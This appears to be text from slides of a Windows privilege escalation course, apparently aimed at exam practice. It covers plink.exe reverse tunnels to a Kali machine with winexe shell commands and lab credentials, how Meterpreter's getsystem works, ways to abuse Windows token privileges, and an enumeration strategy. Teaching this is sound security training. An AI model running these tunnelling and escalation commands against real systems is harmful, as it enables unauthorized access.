<br>125
<br>plink.exe
<br>
<br>
<br>
<br>
<br>
<br>
<br>The general format of a port forwarding command using plink.exe:
<br>
<br>    • plink.exe <user>@<kali> -R <kali-port>:<target-IP>:<target-port>
<br>
<br>Note that the <target-IP> is usually local (e.g. 127.0.0.1).
<br>
<br>plink.exe requires you to SSH to Kali, and then uses the SSH tunnel to forward ports.
<br>
<br>
<br>126
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>    1. First, test that we can still login remotely via winexe:
<br># winexe -U 'admin%password123' //192.168.1.22 cmd.exe
<br>
<br>    2. Using an administrator command prompt, re-enable the firewall:
<br>> netsh advfirewall set allprofiles state on
<br>
<br>    3. Confirm that the winexe command now fails.
<br>
<br>    4. Copy the plink.exe file across to Windows, and then kill the SMB Server on Kali (if you are using it).
<br>
<br>
<br>127
<br>Privilege Escalation
<br>
<br>
<br>
<br>
<br>
<br>
<br>    5. Make sure that the SSH server on Kali is running and accepting root logins. Check that the “PermitRootLogin yes” option is uncommented in /etc/ssh/sshd_config. Restart the SSH service if necessary.
<br>
<br>    6. On Windows, use plink.exe to forward port 445 on Kali to the Windows port 445:
<br>
<br>> plink.exe root@192.168.1.11 -R 445:127.0.0.1:445
<br>
<br>    7. On Kali, modify the winexe command to point to localhost (or 127.0.0.1) instead, and execute it to get a shell via the port forward:
<br>
<br># winexe -U 'admin%password123' //localhost cmd.exe
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>128
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>getsystem
<br>
<br>(Named Pipes &
<br>
<br>Token Duplication)
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>129
<br>Access Tokens
<br>
<br>
<br>
<br>
<br>
<br>
<br>Access Tokens are special objects in Windows which store a user’s identity and privileges.
<br>
<br>Primary Access Token – Created when the user logs in, bound to the current user session. When a user starts a new process, their primary access token is copied and attached to the new process.
<br>
<br>Impersonation Access Token – Created when a process or thread needs to temporarily run with the security context of another user.
<br>
<br>
<br>
<br>
<br>
<br>
<br>130
<br>Token Duplication
<br>
<br>
<br>
<br>
<br>
<br>
<br>Windows allows processes/threads to duplicate their access tokens.
<br>
<br>An impersonation access token can be duplicated into a primary access token this way.
<br>
<br>If we can inject into a process, we can use this functionality to duplicate the access token of the process, and spawn a separate process with the same privileges.
<br>
<br>
<br>131
<br>Named Pipes
<br>
<br>
<br>
<br>
<br>
<br>
<br>You may be already familiar with the concept of a “pipe” in Windows & Linux:
<br>
<br>    • systeminfo | findstr Windows
<br>
<br>A named pipe is an extension of this concept.
<br>
<br>A process can create a named pipe, and other processes can open the named pipe to read or write data from/to it.
<br>
<br>The process which created the named pipe can impersonate the security context of a process which connects to the named pipe.
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>132
<br>getsystem
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>The “getsystem” command in Metasploit’s Meterpreter shell has an almost mythical status.
<br>
<br>By running this simple command, our privileges are almost magically elevated to that of the SYSTEM user.
<br>
<br>What does it actually do?
<br>
<br>
<br>
<br>
<br>133
<br>getsystem
<br>
<br>
<br>
<br>
<br>
<br>
<br>The source code for the getsystem command can be found here: https://github.com/rapid7/metasploit-payloads/tree/d672097e9989e0b4caecfad08ca9debc8e50bb 0c/c/meterpreter/source/extensions/priv
<br>
<br>Three files are worth looking through: elevate.c, namedpipe.c, and tokendup.c
<br>
<br>There are 3 techniques getsystem can use to “get system”.
<br>
<br>
<br>134
<br>Named Pipe Impersonation (In Memory/Admin)
<br>
<br>
<br>
<br>Creates a named pipe controlled by Meterpreter.
<br>
<br>Creates a service (running as SYSTEM) which runs a command that interacts directly with the named pipe.
<br>
<br>Meterpreter then impersonates the connected process to get an impersonation access token (with the SYSTEM security context).
<br>
<br>The access token is then assigned to all subsequent Meterpreter threads, meaning they run with SYSTEM privileges.
<br>
<br>
<br>
<br>135
<br>Named Pipe Impersonation (Dropper/Admin)
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>Very similar to Named Pipe Impersonation (In Memory/Admin).
<br>
<br>Only difference is a DLL is written to disk, and a service created which runs the DLL as SYSTEM.
<br>
<br>The DLL connects to the named pipe.
<br>
<br>
<br>
<br>
<br>136
<br>Token Duplication (In Memory/Admin)
<br>
<br>
<br>
<br>
<br>
<br>
<br>This technique requires the “SeDebugPrivilege”.
<br>
<br>It finds a service running as SYSTEM which it injects a DLL into.
<br>
<br>The DLL duplicates the access token of the service and assigns it to Meterpreter.
<br>
<br>Currently this only works on x86 architectures.
<br>
<br>This is the only technique that does not have to create a service, and operates entirely in memory.
<br>
<br>
<br>
<br>
<br>137
<br>Summary
<br>
<br>
<br>
<br>
<br>
<br>
<br>getsystem was designed as a tool to escalate privileges from a local admin to SYSTEM.
<br>
<br>The Named Pipe techniques require local admin permissions.
<br>
<br>The Token Duplication technique only requires the SeDebugPrivilege privilege, but is also limited to x86 architectures.
<br>
<br>getsystem should not be thought of as a user -> admin privilege escalation method in modern systems.
<br>
<br>
<br>
<br>
<br>
<br>138
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>User
<br>Privileges
<br>User Privileges
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>In Windows, user accounts and groups can be assigned specific “privileges”.
<br>
<br>These privileges grant access to certain abilities.
<br>
<br>Some of these abilities can be used to escalate our overall privileges to that of SYSTEM.
<br>
<br>Highly detailed paper: https://github.com/hatRiot/token-priv
<br>
<br>
<br>
<br>140
<br>Listing our Privileges
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>The whoami command can be used to list our user’s privileges, using the /priv option:
<br>
<br>> whoami /priv
<br>
<br>
<br>Note that “disabled” in the state column is irrelevant here. If the privilege is listed, your user has it.
<br>
<br>
<br>
<br>141
<br>SeImpersonatePrivilege
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>The SeImpersonatePrivilege grants the ability to impersonate any access tokens which it can obtain.
<br>
<br>If an access token from a SYSTEM process can be obtained, then a new process can be spawned using that token.
<br>
<br>The Juicy Potato exploit in a previous section abuses this ability.
<br>
<br>
<br>
<br>142
<br>SeAssignPrimaryPrivilege
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>The SeAssignPrimaryPrivilege is similar to SeImpersonatePrivilege.
<br>
<br>It enables a user to assign an access token to a new process.
<br>
<br>
<br>Again, this can be exploited with the Juicy Potato exploit.
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>143
<br>SeBackupPrivilege
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>The SeBackupPrivilege grants read access to all objects on the system, regardless of their ACL.
<br>
<br>Using this privilege, a user could gain access to sensitive files, or extract hashes from the registry which could then be cracked or used in a pass-the-hash attack.
<br>
<br>
<br>
<br>
<br>144
<br>SeRestorePrivilege
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>The SeRestorePrivilege grants write access to all objects on the system, regardless of their ACL.
<br>
<br>There are a multitude of ways to abuse this privilege:
<br>
<br>    • Modify service binaries.
<br>
<br>    • Overwrite DLLs used by SYSTEM processes
<br>
<br>    • Modify registry settings.
<br>
<br>
<br>145
<br>SeTakeOwnershipPrivilege
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>The SeTakeOwnershipPrivilege lets the user take ownership over an object (the WRITE_OWNER permission).
<br>
<br>Once you own an object, you can modify its ACL and grant yourself write access.
<br>
<br>The same methods used with SeRestorePrivilege then apply.
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>146
<br>Other Privileges (More Advanced)
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>    • SeTcbPrivilege
<br>
<br>
<br>    • SeCreateTokenPrivilege
<br>
<br>
<br>    • SeLoadDriverPrivilege
<br>
<br>
<br>    • SeDebugPrivilege (used by getsystem)
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>147
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>Privilege
<br>Escalation
<br>
<br>Strategy
<br>
<br>
<br>Enumeration
<br>
<br>    1. Check your user (whoami) and groups (net user <username>)
<br>    2. Run winPEAS with fast, searchfast, and cmd options.
<br>    3. Run Seatbelt & other scripts as well!
<br>    4. If your scripts are failing and you don’t know why, you can always run the manual commands from this course, and other Windows PrivEsc cheatsheets online (e.g. https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Method ology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
<br>
<br>Strategy
<br>
<br>Spend some time and read over the results of your enumeration.
<br>If WinPEAS or another tool finds something interesting, make a note of it.
<br>Avoid rabbit holes by creating a checklist of things you need for the privilege escalation method to work.
<br>
<br>Strategy
<br>
<br>Have a quick look around for files in your user’s desktop and other common locations (e.g. C:\ and C:\Program Files).
<br>Read through interesting files that you find, as they may contain useful information that could help escalate privileges.
<br>
<br>Strategy
<br>
<br>Try things that don’t have many steps first, e.g. registry exploits, services, etc.
<br>Have a good look at admin processes, enumerate their versions and search for exploits.
<br>Check for internal ports that you might be able to forward to your attacking machine.
<br>
<br>Strategy
<br>
<br>If you still don’t have an admin shell, re-read your full enumeration dumps and highlight anything that seems odd. This might be a process or file name you aren’t familiar with or even a username.
<br>At this stage you can also start to think about Kernel Exploits.
<br>
<br>Don’t Panic
<br>
<br>Privilege Escalation is tricky.
<br>Practice makes perfect.
<br>Remember: in an exam setting, it might take a while to find the method, but the exam is always intended to be completed within a timeframe. Keep searching!
